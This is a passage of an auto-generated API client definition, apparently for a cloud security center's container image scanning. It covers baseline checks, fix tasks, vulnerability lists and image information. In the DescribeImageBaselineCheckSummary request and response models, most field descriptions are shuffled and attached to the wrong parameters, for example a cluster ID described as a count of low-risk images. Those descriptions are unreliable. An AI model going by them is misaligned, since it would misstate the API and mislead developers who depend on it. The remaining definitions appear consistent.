  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineCheckResult(request: DescribeImageBaselineCheckResultRequest): DescribeImageBaselineCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineCheckResultWithOptions(request, runtime);
}

model DescribeImageBaselineCheckSummaryRequest {
  clusterId?: string(name='ClusterId', description='The number of images on which **low** baseline risks are detected.', example='c60b77fe62093480db6164a3c2fa5****'),
  criteria?: string(name='Criteria', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='Unauthorized access'),
  criteriaType?: string(name='CriteriaType', description='The severity of the image baseline that you want to query. Separate multiple severities with commas (,). Valid values:

*   **high**
*   **medium**
*   **low**', example='BaselineNameAlias'),
  currentPage?: int32(name='CurrentPage', description='The number of images on which **medium** baseline risks are detected.', example='1'),
  lang?: string(name='Lang', description='An array that consists of the check results of image baselines.', example='zh'),
  pageSize?: int32(name='PageSize', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='20'),
  riskLevel?: string(name='RiskLevel', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='high'),
  scanRange?: [ string ](name='ScanRange', description='The keyword of the baseline category.'),
}

model DescribeImageBaselineCheckSummaryResponseBody = {
  baselineResultSummary?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', example='Unauthorized access'),
      baselineClassKey?: string(name='BaselineClassKey', example='hc_image_exploit'),
      baselineNameAlias?: string(name='BaselineNameAlias', example='Unauthorized access'),
      baselineNameKey?: string(name='BaselineNameKey', example='hc_image_exploit'),
      baselineNameLevel?: string(name='BaselineNameLevel', description='The ID of the request, which is used to locate and troubleshoot issues.', example='high'),
      firstScanTime?: long(name='FirstScanTime', example='1626628760000'),
      highRiskImage?: int32(name='HighRiskImage', description='DescribeImageBaselineCheckSummary', example='15'),
      lastScanTime?: long(name='LastScanTime', description='Queries the check results of image baselines that are included in an image scan task.', example='1626628760000'),
      lowRiskImage?: int32(name='LowRiskImage', example='0'),
      middleRiskImage?: int32(name='MiddleRiskImage', description='The number of entries returned per page. Default value: **20**.', example='0'),
      status?: int32(name='Status', description='The number of entries to return on each page. Default value: **20**.', example='0'),
    }
  ](name='BaselineResultSummary', description='The name of the baseline.'),
  pageInfo?: {
    count?: int32(name='Count', description='The pagination information.', example='3'),
    currentPage?: int32(name='CurrentPage', description='The type of the search condition. Valid values:

*   **BaselineNameAlias**: baseline name
*   **BaselineClassAlias**: baseline category', example='1'),
    pageSize?: int32(name='PageSize', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~182997~~) operation to query the IDs of container clusters.', example='20'),
    totalCount?: int32(name='TotalCount', description='The number of entries returned on the current page.', example='3'),
  }(name='PageInfo', description='The search condition for the image baseline.'),
  requestId?: string(name='RequestId', description='The types of the assets that you want to scan.', example='5BD95679-D63A-4151-97D0-188432F4A57'),
}

model DescribeImageBaselineCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineCheckSummaryResponseBody(name='body'),
}

async function describeImageBaselineCheckSummaryWithOptions(request: DescribeImageBaselineCheckSummaryRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineCheckSummary(request: DescribeImageBaselineCheckSummaryRequest): DescribeImageBaselineCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineCheckSummaryWithOptions(request, runtime);
}

model DescribeImageBaselineDetailRequest {
  baselineItemKey?: string(name='BaselineItemKey'),
  imageUuid?: string(name='ImageUuid', example='06293273b67d19516cfcc712194f****'),
  lang?: string(name='Lang', example='zh'),
}

model DescribeImageBaselineDetailResponseBody = {
  baselineDetail?: {
    advice?: string(name='Advice'),
    baselineClassAlias?: string(name='BaselineClassAlias', example='ak_leak'),
    baselineItemAlias?: string(name='BaselineItemAlias'),
    baselineItemKey?: string(name='BaselineItemKey', example='ak_leak'),
    baselineNameAlias?: string(name='BaselineNameAlias'),
    description?: string(name='Description'),
    level?: string(name='Level', example='high'),
    prompt?: string(name='Prompt', example='/usr/aksk.txt:LTAI4GBEG5zaqX**********'),
    resultId?: string(name='ResultId', example='async__c6f3b0b54613383b40bdce593ffe****'),
  }(name='BaselineDetail'),
  requestId?: string(name='RequestId', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeImageBaselineDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineDetailResponseBody(name='body'),
}

async function describeImageBaselineDetailWithOptions(request: DescribeImageBaselineDetailRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemKey)) {
    query['BaselineItemKey'] = request.baselineItemKey;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineDetail(request: DescribeImageBaselineDetailRequest): DescribeImageBaselineDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineDetailWithOptions(request, runtime);
}

model DescribeImageBaselineItemListRequest {
  baselineClassKey?: string(name='BaselineClassKey', description='The key of the baseline type.', example='ak_leak'),
  baselineNameKey?: string(name='BaselineNameKey', description='The key of the baseline name.', example='AccessKey pair leak'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='0b5c7193300da2070220038718ad****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that are scanned.'),
  status?: string(name='Status', description='The status of the baseline risk item. Valid values:

*   **0**: unfixed
*   **1**: fixed
*   **2**: pending verification
*   **3**: fixing failed', example='0'),
  uuids?: [ string ](name='Uuids', description='The UUIDs of images.'),
}

model DescribeImageBaselineItemListResponseBody = {
  baselineItemInfos?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias', description='The alias of the baseline type.', example='AccessKey pair leak'),
      baselineClassKey?: string(name='BaselineClassKey', description='The key of the baseline type.', example='ak_leak'),
      baselineItemAlias?: string(name='BaselineItemAlias', description='The alias of the baseline check item.', example='AccessKey pair leak'),
      baselineItemKey?: string(name='BaselineItemKey', description='The key of the baseline check item.', example='ak_leak'),
      baselineNameAlias?: string(name='BaselineNameAlias', description='The alias of the baseline.', example='AccessKey pair leak'),
      baselineNameKey?: string(name='BaselineNameKey', description='The key of the baseline name.', example='ak_leak'),
      status?: int32(name='Status', description='The status of the baseline risk item. Valid values:

*   **0**: unfixed
*   **1**: fixed
*   **2**: pending verification
*   **3**: fixing failed', example='0'),
      whiteList?: int32(name='WhiteList', description='Indicates whether the baseline check item is added to the whitelist. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
    }
  ](name='BaselineItemInfos', description='An array that consists of baseline check items.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='253'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='24A20733-10A0-4AF6-BE6B-E3322413****'),
}

model DescribeImageBaselineItemListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineItemListResponseBody(name='body'),
}

async function describeImageBaselineItemListWithOptions(request: DescribeImageBaselineItemListRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineItemListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineClassKey)) {
    query['BaselineClassKey'] = request.baselineClassKey;
  }
  if (!Util.isUnset(request.baselineNameKey)) {
    query['BaselineNameKey'] = request.baselineNameKey;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineItemList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineItemList(request: DescribeImageBaselineItemListRequest): DescribeImageBaselineItemListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineItemListWithOptions(request, runtime);
}

model DescribeImageBaselineStrategyRequest {
  lang?: string(name='Lang', description='The language of the content within the request and response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='8037'),
}

model DescribeImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request.', example='9F85AC10-A1FE-54D7-935A-F28D5256****'),
  strategy?: {
    baselineItemList?: [ 
      {
        classKey?: string(name='ClassKey', description='The key of the baseline type.', example='identification'),
        itemKey?: string(name='ItemKey', description='The key of the baseline check item.', example='duplicate_pwd_hash'),
        nameKey?: string(name='NameKey', description='The key of the name for the baseline.', example='identification'),
      }
    ](name='BaselineItemList', description='An array that contains the baselines.'),
    selectedItemCount?: int32(name='SelectedItemCount', description='The number of selected baseline check items.', example='10'),
    strategyId?: long(name='StrategyId', description='The ID of the baseline check policy.', example='8257'),
    strategyName?: string(name='StrategyName', description='The name of the baseline check policy.', example='default'),
    totalItemCount?: int32(name='TotalItemCount', description='The total number of baseline check items.', example='100'),
    type?: string(name='Type', description='The type of the baseline check policy. Valid values:

*   **default**: the default policy
*   **full**: a policy that uses all baselines
*   **normal**: a policy that uses general baselines', example='default'),
  }(name='Strategy', description='An array that consists of the information about the baseline check policy.'),
}

model DescribeImageBaselineStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineStrategyResponseBody(name='body'),
}

async function describeImageBaselineStrategyWithOptions(request: DescribeImageBaselineStrategyRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineStrategy(request: DescribeImageBaselineStrategyRequest): DescribeImageBaselineStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineStrategyWithOptions(request, runtime);
}

model DescribeImageCriteriaRequest {
  value?: string(name='Value', example='525'),
}

model DescribeImageCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name', example='vulStatus'),
      type?: string(name='Type', example='input'),
      values?: string(name='Values', example='NO,YES'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId', example='24A20733-10A0-4AF6-BE6B-E3322413BB68'),
}

model DescribeImageCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageCriteriaResponseBody(name='body'),
}

async function describeImageCriteriaWithOptions(request: DescribeImageCriteriaRequest, runtime: Util.RuntimeOptions): DescribeImageCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageCriteria(request: DescribeImageCriteriaRequest): DescribeImageCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageCriteriaWithOptions(request, runtime);
}

model DescribeImageFixTaskRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**', example='1'),
  endTime?: long(name='EndTime', description='The timestamp when the task ends. Unit: milliseconds.', example='1635575219000'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**', example='20'),
  startTime?: long(name='StartTime', description='The timestamp when the task starts. Unit: milliseconds.', example='1634725571000'),
  status?: string(name='Status', description='The status of the task. Valid values:

*   **1**: The task is running.
*   **2**: The task is successful.
*   **3**: The task failed.', example='1'),
}

model DescribeImageFixTaskResponseBody = {
  buildTasks?: [ 
    {
      buildTaskId?: string(name='BuildTaskId', description='The ID of the task.', example='ivf-939536b5-c3ca-427b-8183-91007756'),
      finishTime?: string(name='FinishTime', description='The timestamp when the task starts. Unit: milliseconds.', example='2021-10-14 20:34:07'),
      fixTime?: string(name='FixTime', description='The timestamp when the task ends. Unit: milliseconds.', example='2021-10-14 20:32:05'),
      newTag?: string(name='NewTag', description='The version of the image after image risks are fixed.', example='redhat8-vault'),
      newUuid?: string(name='NewUuid', description='The UUID of the image after image risks are fixed.', example='2fa731681911ae8d1b5f11893ace****'),
      oldTag?: string(name='OldTag', description='The version of the image.', example='centos8.1-ja'),
      oldUuid?: string(name='OldUuid', description='The UUID of the image.', example='2fa731681911ae8d1b5f11893ace****'),
      regionId?: string(name='RegionId', description='The region of the image.', example='cn-hangzhou'),
      repoName?: string(name='RepoName', description='The name of the image repository.', example='test-redhat'),
      repoNamespace?: string(name='RepoNamespace', description='The namespace of the image.', example='name-002'),
      status?: int32(name='Status', description='The status of the task. Valid values:

*   **1**: The task is running.
*   **2**: The task is successful.
*   **3**: The task failed.', example='2'),
      taskType?: string(name='TaskType', description='The type of the task. The value is fixed as IMAGE_REPAIR. The value indicates a task that fixes image risks.', example='IMAGE_REPAIR'),
      vulAlias?: string(name='VulAlias', description='The alias of the fixed vulnerability.', example='CVE-2007-5686:rpath_linux Information Disclosure'),
    }
  ](name='BuildTasks', description='The tasks returned.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of tasks returned on the current page.', example='12'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page. Default value: **1**', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of tasks returned.', example='12'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The request ID.', example='8AC52BBA-85D3-5F64-9B48-D08437CAF916'),
}

model DescribeImageFixTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageFixTaskResponseBody(name='body'),
}

async function describeImageFixTaskWithOptions(request: DescribeImageFixTaskRequest, runtime: Util.RuntimeOptions): DescribeImageFixTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageFixTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageFixTask(request: DescribeImageFixTaskRequest): DescribeImageFixTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageFixTaskWithOptions(request, runtime);
}

model DescribeImageGroupedVulListRequest {
  aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='High severity vulnerability that affects org.eclipse.jetty:jetty-server'),
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

> You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the ID of the container cluster.', example='c60b77fe62093480db6164a3c2fa5****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  cveId?: string(name='CveId', description='The Common Vulnerabilities and Exposures (CVE) ID of the vulnerability.', example='CVE-2017-15420'),
  groupId?: string(name='GroupId', description='The ID of the asset group.', example='1311'),
  imageDigest?: string(name='ImageDigest', description='The SHA-256 value of the image digest.', example='w213412341dfsfasdfafadfasfasf'),
  imageLayer?: string(name='ImageLayer', description='The layer of the image.', example='b1f5b9420803ad0657cf21566e3e20acc08581e7f22991249ef3aa80b8b1c587'),
  imageTag?: string(name='ImageTag', description='The tag of the image.', example='oval'),
  isLatest?: int32(name='IsLatest', description='Specifies whether to query the vulnerabilities in the latest images. If you do not specify this parameter, the vulnerabilities in all images are queried. Valid values:

*   **0**: does not query the vulnerabilities in the latest images.
*   **1**: queries the vulnerabilities in the latest images.', example='0'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  name?: string(name='Name', description='The name of the vulnerability.', example='debian:10:CVE-2019-9893'),
  necessity?: string(name='Necessity', description='The priority to fix the vulnerability. Valid values:

*   **asap**: high. You must fix the vulnerability at the earliest opportunity.
*   **later**: medium. You can fix the vulnerability based on your business requirements.
*   **nntf**: low. You can ignore the vulnerability.', example='asap'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  patchId?: long(name='PatchId', description='The ID of the patch that is used to fix the vulnerability.', example='1341512412'),
  repoId?: string(name='RepoId', description='The ID of the image repository.', example='qew****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The instance ID of the image repository.', example='i-qewqrqcsadf****'),
  repoName?: string(name='RepoName', description='The name of the image repository.', example='libssh2'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.', example='libssh2'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository.', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='An array consisting of the types of the assets that you want to scan.'),
  type?: string(name='Type', description='The type of the vulnerability that you want to query. Valid values:

*   **cve**: image system vulnerability
*   **sca**: image application vulnerability', example='cve'),
  uuids?: string(name='Uuids', description='The UUID of the asset. Separate multiple UUIDs with commas (,).', example='uuid-13134124****'),
}

model DescribeImageGroupedVulListResponseBody = {
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='2'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName', description='The alias of the vulnerability.', example='RHSA-2017:3075-Important: wget security update'),
      asapCount?: int32(name='AsapCount', description='The number of vulnerabilities that have the high priority.', example='26'),
      canFix?: string(name='CanFix'),
      gmtLast?: long(name='GmtLast', description='The timestamp when the first scan was performed. Unit: milliseconds.', example='1611201274000'),
      lastScanTime?: long(name='LastScanTime', description='The timestamp when the last scan was performed. Unit: milliseconds.', example='1611201274000'),
      laterCount?: int32(name='LaterCount', description='The number of vulnerabilities that have the medium priority.', example='26'),
      name?: string(name='Name', description='The name of the vulnerability.', example='debian:9:CVE-2019-3858'),
      nntfCount?: int32(name='NntfCount', description='The number of vulnerabilities that have the low priority.', example='29'),
      status?: int32(name='Status', description='The status of the vulnerability. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: verifying
*   **3**: added to the whitelist', example='0'),
      tags?: string(name='Tags', description='The tag of the vulnerability. Valid values:

*   Restart required
*   Remote exploitation
*   Exploit exists
*   Exploitable
*   Privilege escalation
*   Code execution', example='EXP exists'),
      type?: string(name='Type', description='The type of the vulnerability. Valid values:

*   **cve**: image system vulnerability
*   **sca**: image application vulnerability', example='cve'),
    }
  ](name='GroupedVulItems', description='An array that consists of the image vulnerabilities.'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='5E244439-UJND-8BF7-26F36E21B9AA'),
  totalCount?: int32(name='TotalCount', description='The total number of image system vulnerabilities.', example='21'),
}

model DescribeImageGroupedVulListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageGroupedVulListResponseBody(name='body'),
}

async function describeImageGroupedVulListWithOptions(request: DescribeImageGroupedVulListRequest, runtime: Util.RuntimeOptions): DescribeImageGroupedVulListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.cveId)) {
    query['CveId'] = request.cveId;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.isLatest)) {
    query['IsLatest'] = request.isLatest;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.patchId)) {
    query['PatchId'] = request.patchId;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageGroupedVulList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageGroupedVulList(request: DescribeImageGroupedVulListRequest): DescribeImageGroupedVulListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageGroupedVulListWithOptions(request, runtime);
}

model DescribeImageInfoListRequest {
  uuids?: string(name='Uuids', example='391abd09184cbd3743d7f5ec125d****,
e6aeb2a5b6004479398b0bcd1160****'),
}

model DescribeImageInfoListResponseBody = {
  imageInfos?: [ 
    {
      alarmCount?: int32(name='AlarmCount', example='10'),
      alarmStatus?: string(name='AlarmStatus', example='YES'),
      digest?: string(name='Digest', example='a3521b04dfdd1361a24be6263f2983cf12ba910989f4d9f7324da7e1e89f****'),
      endpoints?: string(name='Endpoints', example='cn-hangzhou-x7'),
      imageCreate?: long(name='ImageCreate', example='1636962328000'),
      imageId?: string(name='ImageId', example='bb0175afea16138815a8900adeeb0315d88a83a2376eeffa14db1d693a15****'),
      imageSize?: long(name='ImageSize', example='157408623'),
      imageUpdate?: long(name='ImageUpdate', example='1636974116000'),
      instanceId?: string(name='InstanceId', example='i-wz95abw6pa7y79ve****'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', example='harbor'),
      repoId?: string(name='RepoId', example='crr-5qk9v2rdt0s****'),
      repoName?: string(name='RepoName', example='opa-test'),
      repoNamespace?: string(name='RepoNamespace', example='libssh2'),
      repoType?: string(name='RepoType', example='PUBLIC'),
      riskStatus?: string(name='RiskStatus', example='YES'),
      status?: string(name='Status', example='NORMAL'),
      tag?: string(name='Tag', example='v1'),
      tagImmutable?: int32(name='TagImmutable', example='0'),
      uuid?: string(name='Uuid', example='ff9ca084-7faa-4ab2-8728-69024755****'),
      vulCount?: int32(name='VulCount', example='1'),
      vulStatus?: string(name='VulStatus', example='YES'),
    }
  ](name='ImageInfos'),
  requestId?: string(name='RequestId', example='BC3B0DAE-CC0E-59E9-9383-6F060F22****'),
}

model DescribeImageInfoListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageInfoListResponseBody(name='body'),
}

async function describeImageInfoListWithOptions(request: DescribeImageInfoListRequest, runtime: Util.RuntimeOptions): DescribeImageInfoListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageInfoList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageInfoList(request: DescribeImageInfoListRequest): DescribeImageInfoListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageInfoListWithOptions(request, runtime);
}

model DescribeImageInstancesRequest {
  criteria?: string(name='Criteria', description='The search condition that is used to filter the server. The value of this parameter is in the JSON format and contains the following fields:

*   **name**: the search condition

*   **name**: the value of the search condition

*   **logicalExp**: the logical relation for multiple search conditions Valid values:

    *   **OR**: The search conditions use a logical **OR**.
    *   **AND**: The search conditions use a logical **AND**.

> You can call the [DescribeImageCriteria](~~DescribeImageCriteria~~) operation to query the supported search conditions.', example='[{"name":"instanceId","value":"390100182","logicalExp":"AND"}]'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  logicalExp?: string(name='LogicalExp', description='The logical relationship that you want to use to evaluate multiple search conditions. Valid values:

*   **OR**: The search conditions are evaluated by using a logical **OR**.
*   **AND**: The search conditions are evaluated by using a logical **AND**.', example='OR'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> : We recommend that you do not leave this parameter empty.', example='20'),
  scanned?: boolean(name='Scanned', description='Specifies whether the image is scanned. Valid values:

*   **true**
*   **false**', example='true'),
}

model DescribeImageInstancesResponseBody = {
  imageInstanceList?: [ 
    {
